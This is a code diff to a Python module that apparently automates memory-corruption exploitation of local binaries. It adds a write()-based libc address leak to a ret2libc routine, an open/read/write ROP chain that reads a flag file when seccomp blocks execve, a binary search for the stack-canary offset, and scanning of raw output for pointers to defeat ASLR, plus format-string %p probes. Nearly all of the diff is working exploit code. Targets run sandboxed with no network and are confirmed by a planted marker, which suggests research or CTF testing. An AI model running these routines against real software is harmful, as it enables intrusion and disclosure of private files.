@@ -275,7 +275,8 @@ def _read_until(p, deadline, quiet=0.3):
 def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                   puts_off, system_off, binsh_off, ret_gadget=None, one_gadgets=(),
                   base_argv=(), marker: bytes = b"LYKOS_R2L_9931", timeout: float = 8.0,
-                  mem_mb: int = 2048) -> dict:
+                  mem_mb: int = 2048, leaker: str = "puts", pop_rsi=None, pop_rdx=None,
+                  write_plt=None) -> dict:
     """Two-stage ret2libc that defeats ASLR with a puts() info-leak, confirmed by a spawned shell.
 
     Stage 1 (`build_leak_puts`) calls puts(puts@GOT), printing the libc address of puts as raw
@@ -336,15 +337,27 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                     return {"ok": False, "reason": f"spawn failed: {e!r}"}
                 try:
                     _read_until(p, time.time() + 0.5)     # drain the target's first prompt/banner
-                    s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
-                                             puts_plt=puts_plt, ret_to=ret_to, ret_gadget=None)
+                    # Stage-1 leaker. write(1, got, 8) is the ROBUST path (exact 8 raw bytes, no NUL
+                    # or format truncation) when the target exposes write() + pop rsi/rdx; puts/printf
+                    # print the pointer until its trailing NUL (6 bytes). `write_plt` carries the
+                    # write stub in the write case, else `puts_plt` is the puts/printf stub.
+                    if leaker == "write" and pop_rsi and pop_rdx and write_plt:
+                        s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi,
+                                                  pop_rdx=pop_rdx, got=puts_got, write_plt=write_plt,
+                                                  ret_to=ret_to, ret_gadget=None)
+                    else:
+                        s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
+                                                 puts_plt=puts_plt, ret_to=ret_to, ret_gadget=None)
                     try:
                         p.stdin.write(s1)
                         p.stdin.flush()
                     except (BrokenPipeError, OSError):
                         continue
                     burst = _read_until(p, time.time() + timeout / 2)
-                    raw = burst.split(b"\n", 1)[0][:6]    # puts prints the 6-byte pointer then \n
+                    if leaker == "write":
+                        raw = burst[:8]                   # write() emits exactly 8 raw bytes
+                    else:
+                        raw = burst.split(b"\n", 1)[0][:6]  # puts/printf: pointer up to its NUL
                     if len(raw) < 6:
                         continue
                     leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
@@ -578,6 +591,158 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
 
 
 # --- ret2libc past a STACK CANARY (leak it, write it back, then chain) ---------------------------
+def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_got, ret_to,
+             puts_off, open_off, read_off, write_off, scratch=None, scratch_off=None,
+             flag_path=b"flag", flag_marker=b"", ret_gadget=None, leaker="puts", write_plt=None,
+             base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
+    """Two-stage leak + open/read/write: stage 1 leaks libc (puts/write of a GOT slot) and returns to
+    the loop; stage 2 runs an ORW ROP that reads `flag_path` and writes it to stdout. Used when a
+    seccomp filter blocks execve so system("/bin/sh") can never confirm. Confirmation is the
+    DISCLOSURE itself -- `flag_marker` (planted only in the file, never sent as input) appearing in
+    the output proves the chain opened+read the file. Returns {ok, base, disclosed}."""
+    import struct as _struct
+    from . import rop
+    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+    path_blob = (flag_path if isinstance(flag_path, (bytes, bytearray)) else flag_path.encode()) + b"\x00"
+
+    for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
+        for _ in range(3):
+            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+            try:
+                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                     preexec_fn=preexec)
+            except Exception as e:                               # noqa: BLE001
+                return {"ok": False, "reason": f"spawn failed: {e!r}"}
+            try:
+                _read_until(p, time.time() + 0.5)
+                if leaker == "write" and pop_rsi and pop_rdx and write_plt:
+                    s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi,
+                                              pop_rdx=pop_rdx, got=puts_got, write_plt=write_plt,
+                                              ret_to=ret_to)
+                else:
+                    s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
+                                             puts_plt=puts_plt, ret_to=ret_to)
+                try:
+                    p.stdin.write(s1); p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    continue
+                burst = _read_until(p, time.time() + timeout / 2)
+                raw = (burst[:8] if leaker == "write" else burst.split(b"\n", 1)[0][:6])
+                if len(raw) < 6:
+                    continue
+                base = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"), puts_off)
+                if not base:
+                    continue
+                # stage 2: the ORW chain. libc fns relocated by the leaked base. The scratch holding
+                # the path + the file content is taken in LIBC's own writable .bss (base+scratch_off)
+                # -- it is large and PIE-safe, unlike a tiny / RELRO-protected binary .bss. A fixed
+                # binary `scratch` is the fallback for an unusual no-PIE layout.
+                eff_scratch = (base + scratch_off) if scratch_off is not None else scratch
+                if eff_scratch is None:
+                    continue
+                s2 = rop.build_orw_rop(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx,
+                                       open_fn=base + open_off, read_fn=base + read_off,
+                                       write_fn=base + write_off, scratch=eff_scratch,
+                                       path_len=len(path_blob) + 8, ret_gadget=align)
+                try:
+                    p.stdin.write(s2); p.stdin.flush()
+                    time.sleep(0.2)
+                    p.stdin.write(path_blob)              # consumed by the ORW's read(0, scratch, ..)
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    break
+                out = _read_until(p, time.time() + timeout, quiet=1.2)
+                if flag_marker and flag_marker in out:
+                    return {"ok": True, "base": base, "align": align,
+                            "disclosed": out[:400].decode("latin-1", "ignore")}
+            finally:
+                for s in (p.stdin, p.stdout):
+                    try:
+                        if s is not None:
+                            s.close()
+                    except Exception:                            # noqa: BLE001
+                        pass
+                _kill(p)
+                try:
+                    p.wait(timeout=2)
+                except Exception:                                # noqa: BLE001
+                    pass
+    return {"ok": False, "reason": "ORW chain did not disclose the flag", "base": None}
+
+
+def discover_canary_offset(exe, workdir, *, canary_trigger=b"", base_argv=(), timeout: float = 8.0,
+                           mem_mb: int = 2048, lo: int = 8, hi: int = 400):
+    """Auto-recover the overflow distance to the STACK CANARY by binary-searching the payload length
+    at which the target FIRST trips __stack_chk_fail. A canary target aborts the normal L2 IP-control
+    probe, so the control offset cannot be measured that way; but overwriting the canary's low byte at
+    offset C needs exactly K=C+1 bytes, and any K>=C+1 aborts while K<C+1 does not -- a clean monotone
+    threshold. `canary_trigger` is sent first to consume the leak read (the same two-step protocol
+    canary_ret2libc uses). Returns (canary_offset, ret_offset) -- ret is 16 bytes past the canary in
+    the standard x86-64 frame ([buf][canary][saved rbp][return]) -- or None when the shape does not
+    hold (the high end never aborts, i.e. not a plain saved-canary stack overflow on this channel)."""
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+    trig = (canary_trigger if isinstance(canary_trigger, (bytes, bytearray))
+            else (canary_trigger.encode("latin-1") if canary_trigger else b""))
+
+    def _aborts(k):
+        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+        try:
+            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                 preexec_fn=preexec)
+        except Exception:                                    # noqa: BLE001
+            return None
+        try:
+            _read_until(p, time.time() + 0.4)                # banner
+            if trig:
+                try:
+                    p.stdin.write(trig); p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    return None
+                _read_until(p, time.time() + 0.4)            # drain the leak output
+            try:
+                p.stdin.write(b"A" * k); p.stdin.flush(); p.stdin.close()
+            except (BrokenPipeError, OSError):
+                pass
+            out = _read_until(p, time.time() + timeout / 2)
+            try:
+                rc = p.wait(timeout=2)
+            except Exception:                                # noqa: BLE001
+                rc = None
+            # glibc prints "*** stack smashing detected ***" and raises SIGABRT (6); bwrap reports
+            # 128+6, a native run -6.
+            return (b"stack smashing" in out) or (rc in (-6, 134))
+        finally:
+            _kill(p)
+            try:
+                p.wait(timeout=1)
+            except Exception:                                # noqa: BLE001
+                pass
+
+    if not _aborts(hi):
+        return None                                          # no canary abort even at the far end
+    a, b = lo, hi
+    if _aborts(a):                                           # even the low end aborts: search below it
+        a = 1
+    while a < b:                                             # smallest K that aborts
+        mid = (a + b) // 2
+        res = _aborts(mid)
+        if res is None:
+            return None
+        if res:
+            b = mid
+        else:
+            a = mid + 1
+    canary_offset = max(0, a - 1)
+    return canary_offset, canary_offset + 16
+
+
 def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_trigger,
                     pop_rdi, puts_plt, puts_got, ret_to, puts_off, system_off, binsh_off,
                     ret_gadget=None, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
@@ -695,6 +860,23 @@ def _allint(b):
         return False
 
 
+def _le_pointer_words(data: bytes, cap: int = 256) -> list:
+    """Little-endian 8-byte words in `data` that look like an x86-64 userspace pointer: the top two
+    bytes zero and the next byte 0x7f (libc/mmap/stack) or 0x55/0x56 (a PIE image mapping). A raw
+    stack over-read (CWE-125) echoes memory as BINARY, not hex, so the saved return into
+    __libc_start_main, environ/stack and PIE code pointers sit there as raw words -- harvesting them
+    gives classify_leak the multiple corroborating pointers it needs to pin a base from an
+    un-labelled leak. All byte offsets are scanned (a text prefix can push pointers off 8-byte
+    alignment); spurious hits are filtered downstream by cross-pointer corroboration."""
+    out = []
+    for i in range(0, max(0, len(data) - 7)):
+        if data[i + 6] == 0 and data[i + 7] == 0 and data[i + 5] in (0x7F, 0x55, 0x56):
+            out.append(int.from_bytes(data[i:i + 8], "little"))
+            if len(out) >= cap:
+                break
+    return out
+
+
 # --- automatic leak classification + provocation (gap #2) ---------------------------------------
 def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
     """Auto-classify a leaked-pointer burst: recover the PIE base (from the binary's own symbols),
@@ -724,7 +906,13 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
     exedir = str(Path(exe).resolve().parent)
     # Sequential dump sized to the read, then a few positional probes for deep code/libc pointers.
     seq = b"%p" + b".%p" * max(1, (read_cap - 4) // 3)
-    triggers = [seq[:read_cap] + b"\n"]
+    # `b""` FIRST: classify the target's OWN output with no provocation. Many real programs disclose a
+    # pointer through normal flow -- a diagnostic that prints `&main`/an object address, an error that
+    # echoes a heap/libc pointer, a status line. That is a usable ASLR-defeating leak with no
+    # format-string sink at all, and the old harness threw the pre-trigger banner away and only ever
+    # classified a %p dump. The format-string provocations follow for a printf(user) sink.
+    triggers = [b""]
+    triggers += [seq[:read_cap] + b"\n"]
     triggers += [(b"|".join(b"%%%d$p" % i for i in range(a, a + 12)) + b"\n")[:read_cap] + b"\n"
                  for a in (7, 19, 31)]
     best = {"pie_base": None, "libc_base": None, "canary": None, "trigger": None, "dump": b""}
@@ -739,13 +927,19 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
         except Exception:                                    # noqa: BLE001
             continue
         try:
-            _read_until(p, time.time() + 0.4)
-            try:
-                p.stdin.write(trig)
-                p.stdin.flush()
-            except (BrokenPipeError, OSError):
-                continue
-            dump = _read_until(p, time.time() + timeout / 2)
+            # The pre-trigger banner is the target's OWN output -- keep it (a natural leak lives
+            # here), don't discard it. For the empty trigger we classify the banner alone; otherwise
+            # we fold it into the provoked dump so a natural pointer is seen even alongside a %p sink.
+            banner = _read_until(p, time.time() + (timeout / 2 if not trig else 0.4))
+            if trig:
+                try:
+                    p.stdin.write(trig)
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    continue
+                dump = banner + _read_until(p, time.time() + timeout / 2)
+            else:
+                dump = banner
         finally:
             for s in (p.stdin, p.stdout):
                 try:
@@ -758,7 +952,14 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
                 p.wait(timeout=2)
             except Exception:                                # noqa: BLE001
                 pass
+        # Harvest pointers two ways. (1) HEX TEXT: a %p dump or a diagnostic that prints an address.
+        # (2) RAW LITTLE-ENDIAN WORDS: a stack over-read (the common CWE-125) echoes binary memory,
+        # not hex -- the saved return into __libc_start_main, environ/stack pointers, PIE code
+        # pointers all sit there as raw 8-byte words. Scanning them gives classify_leak the MULTIPLE
+        # corroborating pointers it needs to pin a base from an un-labelled leak. A plausible x86-64
+        # userspace pointer is 0x0000_7fxx_xxxx_xxxx (libc/mmap/stack) or 0x0000_55/56xx (PIE image).
         vals = [int(m.group(0), 16) for m in hexrx.finditer(dump) if _allint(m.group(0))]
+        vals += _le_pointer_words(dump)
         cls = classify_leak(vals, target_bytes, libc_data)
         # keep the richest result (most fields recovered)
         score = sum(cls[k] is not None for k in ("pie_base", "libc_base", "canary"))
